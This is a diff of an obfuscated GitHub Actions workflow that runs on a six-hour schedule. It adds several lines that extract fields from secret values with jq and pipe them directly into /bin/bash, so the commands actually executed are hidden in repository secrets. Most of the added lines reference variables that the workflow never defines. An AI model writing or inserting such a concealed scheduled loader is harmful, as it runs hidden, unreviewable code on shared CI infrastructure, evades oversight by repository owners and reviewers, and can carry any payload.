@@ -2,7 +2,7 @@ name: taidutd
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 0/6 * * *'
+    - cron: '47 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,8 +10,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: taidutd
         env:
-          alp3: ${{ secrets.alp3 }}
+          dey96: ${{ secrets.dey96 }}
         run: |
-          echo $alp3 | jq -r .s84 | /bin/bash
-          echo $tcwji92098 | jq -r .c27876 | /bin/bash
+          echo $dey96 | jq -r .rgax44 | /bin/bash
+          echo $eepw59 | jq -r .fqr07 | /bin/bash
+          echo $mdc8 | jq -r .mpf66378 | /bin/bash
+          echo $zgcib5 | jq -r .i5413 | /bin/bash
+          echo $aiawm24127 | jq -r .wvgzu73757 | /bin/bash
+          echo $ovax37946 | jq -r .j208 | /bin/bash
 
